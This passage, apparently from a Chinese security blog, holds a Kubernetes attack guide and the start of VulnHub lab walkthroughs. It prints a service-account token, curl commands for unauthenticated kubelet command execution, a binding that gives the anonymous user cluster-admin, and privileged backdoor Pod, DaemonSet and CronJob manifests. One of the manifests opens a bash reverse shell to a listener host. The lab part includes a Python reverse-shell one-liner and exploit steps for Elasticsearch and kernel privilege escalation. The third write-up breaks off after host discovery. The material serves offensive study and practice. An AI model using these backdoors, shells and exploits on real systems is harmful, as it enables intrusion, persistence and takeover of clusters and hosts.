<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl describe secrets</span></span><br><span class="line">Name:         default-token-7xts4</span><br><span class="line">Namespace:    default</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  kubernetes.io/service-account.name: default</span><br><span class="line">              kubernetes.io/service-account.uid: 720096c3-c0ea-4f03-889c-6d450ab62d2c</span><br><span class="line"></span><br><span class="line">Type:  kubernetes.io/service-account-token</span><br><span class="line"></span><br><span class="line">Data</span><br><span class="line">====</span><br><span class="line">ca.crt:     1066 bytes</span><br><span class="line">namespace:  7 bytes</span><br><span class="line">token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IjVlYkx2aWRndzBVbm42VHYzQmNXaXdjdkl4cGZyWDFFd3l0aFBJY3pxNEkifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tN3h0czQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjcyMDA5NmMzLWMwZWEtNGYwMy04ODljLTZkNDUwYWI2MmQyYyIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.sSEmxeJ2XIwb95t50ehRGvTUEOOQjjdTK5ula6AtgPV4z7m7YzpPKDSeQSauLWul272j9SLYyuiWR6rnoC4NvAgxgsAbapraJcyDjv0DadWUfbTcjLUSNGGaSQMuOyrYPA_ahK6UuFS_kAOiXL71gPLjE6xUcm8T4-aAgszUSG78OrMDmDao9ZoS2iD0TOVWNsxfUFw712meB4t2C5cj5DhfrDKdGLlJ4HRs3E0EYyPkX8NizaeSjifT-_AxFL7_KrL6GM4nMM8AEWoSn3v1N4CyQkvU5Bb2xu4hyZGX6OAWkcFNoMC4jEfeIgWbj6MC0elhuGYVznyr65GKtcjG6w</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="1-4-pod内判断kubernetes环境"><a href="#1-4-pod内判断kubernetes环境" class="headerlink" title="1.4 pod内判断kubernetes环境"></a>1.4 pod内判断kubernetes环境</h3><ul>
<li><p>命令：<code>env | grep KUBE</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># env | grep KUBE</span></span><br><span class="line">KUBERNETES_SERVICE_PORT=443</span><br><span class="line">KUBERNETES_PORT=tcp://10.96.0.1:443</span><br><span class="line">KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1</span><br><span class="line">KUBERNETES_PORT_443_TCP_PORT=443</span><br><span class="line">KUBERNETES_PORT_443_TCP_PROTO=tcp</span><br><span class="line">KUBERNETES_SERVICE_PORT_HTTPS=443</span><br><span class="line">KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443</span><br><span class="line">KUBERNETES_SERVICE_HOST=10.96.0.1</span><br></pre></td></tr></table></figure></li>
<li><p>命令：<code>cat /etc/resolv.conf</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># cat /etc/resolv.conf</span></span><br><span class="line">nameserver 10.96.0.10</span><br><span class="line">search default.svc.cluster.local svc.cluster.local cluster.local</span><br><span class="line">options ndots:5</span><br></pre></td></tr></table></figure></li>
<li><p>命令：<code>cat /proc/1/mountinfo</code></p>
</li>
</ul>
<h2 id="2-未授权访问攻击"><a href="#2-未授权访问攻击" class="headerlink" title="2. 未授权访问攻击"></a>2. 未授权访问攻击</h2><h3 id="2-1-Kubernetes-API-Server未授权访问"><a href="#2-1-Kubernetes-API-Server未授权访问" class="headerlink" title="2.1 Kubernetes API Server未授权访问"></a>2.1 Kubernetes API Server未授权访问</h3><p><strong>老版本中：</strong></p>
<p>默认情况，Kubernetes API Server提供HTTP的两个端口：</p>
<p>1）本地主机端口</p>
<ul>
<li>HTTP服务</li>
<li>默认端口8080，修改标识–insecure-port</li>
<li>默认IP是本地主机，修改标识—insecure-bind-address</li>
<li>在HTTP中没有认证和授权检查</li>
<li>主机访问受保护</li>
</ul>
<p>2）Secure Port</p>
<ul>
<li>默认端口6443，修改标识—secure-port</li>
<li>默认IP是首个非本地主机的网络接口，修改标识—bind-address</li>
<li>HTTPS服务。设置证书和秘钥的标识，–tls-cert-file，–tls-private-key-file</li>
<li>认证方式，令牌文件或者客户端证书</li>
<li>使用基于策略的授权方式</li>
</ul>
<p><strong>新版本中：</strong></p>
<p>只用默认的6443端口，并且不开启HTTP服务。</p>
<p>如果接口未授权访问则如下</p>
<p><img src="../images/pic/k8s8.jpg"> </p>
<h3 id="2-2-Kubernetes-Dashboard未授权访问"><a href="#2-2-Kubernetes-Dashboard未授权访问" class="headerlink" title="2.2 Kubernetes Dashboard未授权访问"></a>2.2 Kubernetes Dashboard未授权访问</h3><p>Kuberntetes Dashboard是一个基于Web的Kubernetes用户界面。我们可以用它来在集中部署、调试容器化应用，或者管理集群资源。</p>
<p>Dashboard需要配置token才能访问，在1.10.1版本之前提供了跳过选项可以直接访问。</p>
<p>如下高版本中必须提供token才能登录</p>
<p><img src="../images/pic/k8s9.jpg"></p>
<h3 id="2-3-Kubelet未授权访问"><a href="#2-3-Kubelet未授权访问" class="headerlink" title="2.3 Kubelet未授权访问"></a>2.3 Kubelet未授权访问</h3><p>每一个Node节点都有一个kubelet服务，kubelet监听了10250，10248，10255等端口。</p>
<p>其中10250端口是kubelet与apiserver进行通信的主要端口，通过该端口kubelet可以知道自己当前应该处理的任务，该端口在最新版Kubernetes是有鉴权的，但在开启了接受匿名请求的情况下，不带鉴权信息的请求也可以使用10250提供的能力；因为Kubernetes流行早期，很多挖矿木马基于该端口进行传播和利用，所以该组件在安全领域部分群体内部的知名度反而会高于 APIServer。</p>
<p>在新版本Kubernetes中当使用以下配置打开节点匿名访问时便可能存在kubelet未授权访问漏洞：</p>
<p><img src="../images/pic/k8s10.png" alt="image-20211029170007795"> </p>
<p>systemctl restart kubectl</p>
<p>master节点执行：kubectl create clusterrolebinding the-boss –user system:anonymous –clusterrole cluster-admin</p>
<p>查看pods:</p>
<p>curl –insecure <a href="https://172.16.42.101:10250/pods">https://172.16.42.101:10250/pods</a></p>
<p>根据容器信息执行命令：curl -k <a href="https://172.16.42.101:10250/run/namespace/name/metadata-name/container-name">https://172.16.42.101:10250/run/namespace/name/metadata-name/container-name</a> -d “cmd=id”</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl -k https:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.101</span>:<span class="number">10250</span><span class="regexp">/run/</span>default<span class="regexp">/nginx/</span>nginx -d <span class="string">&quot;cmd=id&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="../images/pic/k8s11.png" alt="image-20211029173138156"> </p>
<p><code>curl -k https://172.16.42.101:10250/run/default/kibana-577d8c75d6-pgw5p/kibana -d &quot;cmd=id&quot;</code></p>
<h2 id="3-后门pod"><a href="#3-后门pod" class="headerlink" title="3. 后门pod"></a>3. 后门pod</h2><p>如果我们拥有可以创建Pod的权限，那么我们就可以部署Pod后门。</p>
<h3 id="3-1-特权容器pod"><a href="#3-1-特权容器pod" class="headerlink" title="3.1 特权容器pod"></a>3.1 特权容器pod</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">shadowtest</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">creator:</span> <span class="string">shadowflow</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">hostPID:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hostIPC:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">nodeSelector:</span></span><br><span class="line">    <span class="comment"># kubernetes.io/hostname 需要先查看 pod 所在的节点进行修改</span></span><br><span class="line">    <span class="comment"># kubectl get pods -o wide -A</span></span><br><span class="line">    <span class="comment"># kubernetes.io/hostname:  k8s-node1</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">trpc</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;alpine&quot;</span></span><br><span class="line">    <span class="comment"># imagePullPolicy: &quot;Never&quot;</span></span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">capabilities:</span></span><br><span class="line">        <span class="attr">add:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">SYS_ADMIN</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;tail -f /dev/null&quot;</span>]</span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">dev</span></span><br><span class="line">        <span class="attr">mountPath:</span> <span class="string">/host/dev</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">proc</span></span><br><span class="line">        <span class="attr">mountPath:</span> <span class="string">/host/proc</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">sys</span></span><br><span class="line">        <span class="attr">mountPath:</span> <span class="string">/host/sys</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">        <span class="attr">mountPath:</span> <span class="string">/near_sandbox</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">proc</span></span><br><span class="line">      <span class="attr">hostPath:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/proc</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">dev</span></span><br><span class="line">      <span class="attr">hostPath:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/dev</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">sys</span></span><br><span class="line">      <span class="attr">hostPath:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/sys</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">      <span class="attr">hostPath:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure>

<p>使用如下命令即可部署</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">kubectl <span class="built_in">apply</span> -f node_shell.yaml</span><br></pre></td></tr></table></figure>

<p>攻击方式：</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">kubectl <span class="built_in">create</span> -f node_shell.yaml</span><br><span class="line">kubectl exec -<span class="keyword">it</span> -f node_shell.yaml <span class="comment">-- sh</span></span><br><span class="line">chroot /near_sandbox/</span><br></pre></td></tr></table></figure>



<p>部署成功后的利用方式跟特权容器逃逸是一样的，可以参考：<a href="https://shadowfl0w.github.io/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">https://shadowfl0w.github.io/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/</a></p>
<h3 id="3-2-Daemonset后门Pod"><a href="#3-2-Daemonset后门Pod" class="headerlink" title="3.2 Daemonset后门Pod"></a>3.2 Daemonset后门Pod</h3><p>Daemonset后门会在每个Node上部署一个后门</p>
<p>从 v1.16 开始, 用 apps/v1 代替 extensions/v1beta1</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">DaemonSet</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">backdoor-daemonset</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">backdoor-daemonset</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">backdoor-daemonset</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">backdoor-daemonset</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">hostPID:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">restartPolicy:</span> <span class="string">Always</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">backdoor-daemonset</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.14.2</span></span><br><span class="line">        <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">81</span></span><br><span class="line">        <span class="attr">securityContext:</span></span><br><span class="line">          <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">capabilities:</span></span><br><span class="line">            <span class="attr">add:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">SYS_ADMIN</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">NET_ADMIN</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">SYS_PTRACE</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">AUDIT_CONTROL</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">MKNOD</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">SETFCAP</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">            <span class="attr">mountPath:</span> <span class="string">/near_sandbox</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure>

<p>攻击方式</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">kubectl apply -f backdoor-daemonset.yaml</span><br><span class="line"></span><br><span class="line">kubectl exec -it backdoor-daemonset-<span class="number">4</span>shzz -- <span class="regexp">/bin/</span>bash</span><br><span class="line"></span><br><span class="line">chroot /near_sandbox</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>



<h3 id="3-3-部署K8s-CronJob后门Pod"><a href="#3-3-部署K8s-CronJob后门Pod" class="headerlink" title="3.3 部署K8s CronJob后门Pod"></a>3.3 部署K8s CronJob后门Pod</h3><p>CronJobs 对于创建周期性的、反复重复的任务很有用，例如执行数据备份或者发送邮件。 CronJobs 也可以用来计划在指定时间来执行的独立任务，例如计划当集群看起来很空闲时 执行某个 Job。</p>
<p>pod:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">batch/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">CronJob</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">backdoor-cronjob</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">schedule:</span> <span class="string">&quot;*/1 * * * *&quot;</span></span><br><span class="line">  <span class="attr">jobTemplate:</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">template:</span></span><br><span class="line">        <span class="attr">spec:</span></span><br><span class="line">          <span class="attr">containers:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">backdoor-cronjob</span></span><br><span class="line">            <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">            <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">            <span class="attr">args:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">/bin/bash</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;/bin/bash &gt;&amp; /dev/tcp/172.16.42.101/4444 0&gt;&amp;1&quot;</span></span><br><span class="line">          <span class="attr">restartPolicy:</span> <span class="string">OnFailure</span></span><br></pre></td></tr></table></figure>

<p>攻击方式：</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta">#创建后门cronjob</span></span><br><span class="line">kubectl apply -f backdoor-cronjob.yaml</span><br><span class="line"><span class="meta">#查看执行情况</span></span><br><span class="line">kubectl <span class="keyword">get</span> jobs --watch</span><br></pre></td></tr></table></figure>

<p>实际对抗过程中，虽然我们也会对恶意的POD和容器做一定的持久化，但是直接使用 CronJob 的概率却不高。在创建后门POD的时候，直接使用 restartPolicy: Always 就可以方便优雅的进行后门进程的重启和维持，所以对 CronJob 的需求反而没那么高。</p>
<h2 id="5-其他攻击"><a href="#5-其他攻击" class="headerlink" title="5. 其他攻击"></a>5. 其他攻击</h2><p>除了上述常见攻击方式外，还有一些其他的攻击方式，暂时不分析，点到为止。</p>
<p><strong>1. CVE-2018-1002105</strong></p>
<p>CVE-2018-1002105是一个Kubernetes的权限提升漏洞，允许攻击者在拥有集群内低权限的情况下提升权限至Kubernetes API Server权限。所有低于v1.10.11、v1.11.5、v.12.3版本的Kubernetes均受影响。</p>
<p>简单来说，通过构造一个特殊的请求，攻击者能够借助Kubernetes API Server作为代理，建立一个到后端服务器的连接，进而以Kubernetes API Server的身份向后端服务器发送任意请求，实质就是权限提升。</p>
<p><strong>2. CVE-2019-11253:YAML炸弹</strong></p>
<p>CVE-2019-11253是一个存在于API Server对YAML、JSON数据解析流程中的漏洞，恶意的YAML、JSON载荷可能使API Server大量消耗CPU、内存资源，从而导致拒绝服务攻击。</p>
<p><strong>3. CVE-2019-9512/9514: HTTP/2 协议实现存在问题</strong></p>
<p>CVE-2019-9512和CVE-2019-9514存在于Kubernetes依赖的Go语言库net/http和golang.org/x/net/http2中。</p>
<ul>
<li>CVE-2019-9512漏洞使得kubernetes集群存在Ping Flood攻击风险：攻击者可以持续不断向HTTP/2对端发送PING帧，但不读取相应，促使对端维护一个内部队列存储产生的响应帧。如果响应帧入队列效率不高，可消耗大量CPU、内存资源。</li>
<li>CVE-2019-9514漏洞使kubernetes集群存在Reset Flood攻击风险：攻击者可以开启若干个stream,在每个流上发送非法请求，这将促使对端发送一个RST_STREAM帧尝试终止。如果RST_STREAM帧入队列效率不高，可消耗大量CPU、内存资源。</li>
</ul>
<p><strong>4. Kubernetes网络中间人攻击</strong></p>
<p>通过修改kube-dns服务的地址，可以在Kubernetes网络中完成中间人攻击。</p>
<h2 id="6-参考"><a href="#6-参考" class="headerlink" title="6. 参考"></a>6. 参考</h2><p>《云原生安全攻防实践与体系构建》</p>
]]></content>
      <categories>
        <category>云原生安全</category>
      </categories>
      <tags>
        <tag>Kubernetes安全</tag>
      </tags>
  </entry>
  <entry>
    <title>打靶练习1-Social Network</title>
    <url>/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A01-Social%20Network/</url>
    <content><![CDATA[<blockquote>
<p>天长地久。天地所以能长且久者，以其不自生，故能长生。</p>
</blockquote>
<p>靶机：BoredHackerBlog: Social Network</p>
<span id="more"></span>



<p>靶机地址：<a href="https://www.vulnhub.com/entry/boredhackerblog-social-network,454/">https://www.vulnhub.com/entry/boredhackerblog-social-network,454/</a></p>
<p>建议使用VirtualBox搭建环境</p>
<p><strong>局域网二层扫描</strong></p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo arp-scan -l</span></span><br></pre></td></tr></table></figure>

<ol>
<li><p>判断存活主机<a href="https://github.com/k8gege/LadonGo">Ladon</a></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> ./Ladon <span class="number">192.168.0.101</span>/<span class="number">24</span> IcmpScan</span><br></pre></td></tr></table></figure></li>
<li><p>端口扫描，确定ip</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> <span class="number">192.168.0.104</span></span><br></pre></td></tr></table></figure></li>
<li><p>全端口扫描：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p- <span class="number">192.168.0.104</span></span><br></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Starting</span> Nmap <span class="number">7</span>.<span class="number">91</span> ( https://nmap.org ) at <span class="number">2021</span>-<span class="number">10</span>-<span class="number">31</span> <span class="number">11</span>:<span class="number">05</span> CST</span><br><span class="line"><span class="attribute">Nmap</span> scan report for <span class="number">192.168.0.104</span></span><br><span class="line"><span class="attribute">Host</span> is up (<span class="number">0</span>.<span class="number">0013</span>s latency).</span><br><span class="line"><span class="attribute">Not</span> shown: <span class="number">65533</span> closed ports</span><br><span class="line"><span class="attribute">PORT</span>     STATE SERVICE</span><br><span class="line"><span class="attribute">22</span>/tcp   open  ssh</span><br><span class="line"><span class="attribute">5000</span>/tcp open  upnp</span><br></pre></td></tr></table></figure>

</li>
<li><p>服务扫描</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p<span class="number">22</span>,<span class="number">5000</span> -sV <span class="number">192.168.0.104</span></span><br></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">PORT</span>     STATE SERVICE VERSION</span><br><span class="line"><span class="attribute">22</span>/tcp   open  ssh     OpenSSH <span class="number">6</span>.<span class="number">6</span>p<span class="number">1</span> Ubuntu <span class="number">2</span>ubuntu<span class="number">1</span> (Ubuntu Linux; protocol <span class="number">2</span>.<span class="number">0</span>)</span><br><span class="line"><span class="attribute">5000</span>/tcp open  http    Werkzeug httpd <span class="number">0</span>.<span class="number">14</span>.<span class="number">1</span> (Python <span class="number">2</span>.<span class="number">7</span>.<span class="number">15</span>)</span><br><span class="line"><span class="attribute">Service</span> Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure></li>
<li><p>目录扫描</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">ffuf -w ~<span class="regexp">/wordlist/</span>Web-Fuzzing-Box<span class="regexp">/Dir/</span>Directories.txt -u http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.104</span>:<span class="number">5000</span>FUZZ -mc all -v -fc <span class="number">404</span></span><br></pre></td></tr></table></figure>

<p><a href="http://192.168.0.104:5000/admin">http://192.168.0.104:5000/admin</a></p>
</li>
<li><p>python反弹shell</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;192.168.0.101&quot;</span>,<span class="number">8081</span>));os.dup<span class="number">2</span>(s.fileno(),<span class="number">0</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">1</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure></li>
<li><p>容器识别：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ls</span> <span class="string">/.dockerenv</span></span><br><span class="line">或者</span><br><span class="line">cat <span class="string">/proc/1/cgroup</span></span><br></pre></td></tr></table></figure></li>
<li><p>存活ip扫描</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">for</span> i in $(seq <span class="number">1</span> <span class="number">10</span>); do ping -c <span class="number">1</span> <span class="number">172</span>.<span class="number">17</span>.<span class="number">0</span>.$i; done</span><br></pre></td></tr></table></figure></li>
<li><p>代理建立</p>
<img src="../images/pic/daba1.png" alt="image-20211031121233836" style="zoom:50%;" /> </li>
<li><p>代理扫描</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxychains4</span> nmap -Pn -sT <span class="number">172.17.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">proxychains4</span> nmap -Pn -sT <span class="number">172.17.0.2</span></span><br><span class="line"><span class="attribute">proxychains4</span> nmap -p<span class="number">9200</span> -Pn -sT -sV <span class="number">172.17.0.2</span></span><br></pre></td></tr></table></figure></li>
<li><p>搜索Elasticsearch Exp</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">searchsploit Elasticsearch</span></span><br></pre></td></tr></table></figure></li>
<li><p>复制payload</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cp <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/linux/</span>remote<span class="regexp">/36337.py ./</span></span><br></pre></td></tr></table></figure></li>
<li><p>漏洞利用CVE-2015-1427</p>
</li>
<li><p>登录，尝试sudo权限：sudo -s</p>
</li>
<li><p>搜索内核漏洞</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">searchsploit</span> linux <span class="number">3</span>.<span class="number">13</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">CVE</span>-<span class="number">2015</span>-<span class="number">1328</span></span><br></pre></td></tr></table></figure></li>
<li><p>复制exp</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cp <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/linux/</span>local<span class="regexp">/37292.c ./</span></span><br></pre></td></tr></table></figure></li>
<li><p>修改exp</p>
<img src="../images/pic/daba2.png" alt="image-20211031202653110" style="zoom:50%;" /> </li>
<li><p>搜索依赖so文件</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">locate ofs-<span class="keyword">lib</span>.so</span><br></pre></td></tr></table></figure></li>
<li><p>靶机下载so文件和exp</p>
</li>
<li><p>移动到tmp目录</p>
</li>
<li><p>执行exp</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">chmod</span> +<span class="keyword">x</span> <span class="keyword">exp</span></span><br><span class="line">./<span class="keyword">exp</span></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>红队技术</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>打靶练习2-cloud-av</title>
    <url>/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A02-cloud-av/</url>
    <content><![CDATA[<p>fscan信息侦查 | sql注入 | 命令注入 | nc串联反弹shell | 信息收集 | ssh爆破 | 代码审计 | suid提权</p>
<span id="more"></span>

<h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1. 环境"></a>1. 环境</h2><p><a href="https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/">靶机地址</a></p>
<p>导入Virtualbox</p>
<p>设置网络让攻击机和靶机互通</p>
<p>攻击机kali: 192.168.0.10</p>
<h2 id="2-主机发现"><a href="#2-主机发现" class="headerlink" title="2. 主机发现"></a>2. 主机发现</h2><ul>
<li><p>使用<a href="https://github.com/k8gege/LadonGo">Ladon</a></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo .<span class="regexp">/LadonLinux 192.168.0.0/</span><span class="number">24</span> IcmpScan</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用ping不需要超级管理员权限</span></span><br><span class="line">.<span class="regexp">/LadonLinux 192.168.0.0/</span><span class="number">24</span> PingScan</span><br></pre></td></tr></table></figure>

<p>结果不太准，不稳定。ladon也支持</p>
</li>
<li><p>使用arp-scan</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo arp-scan -l</span></span><br></pre></td></tr></table></figure>

<p>没有发现</p>
</li>
<li><p>arping（是linux机器都会有）</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">for</span> i in $(seq <span class="number">1</span> <span class="number">254</span>); do sudo arping -c <span class="number">2</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.$i; done</span><br></pre></td></tr></table></figure></li>
<li><p>fscan</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo .<span class="regexp">/fscan_darwin -h 192.168.0.0/</span><span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用ping不需要超级管理员</span></span><br><span class="line">.<span class="regexp">/fscan_darwin -h 192.168.0.0/</span><span class="number">24</span> -ping</span><br></pre></td></tr></table></figure></li>
</ul>
<p>通过fscan发现</p>
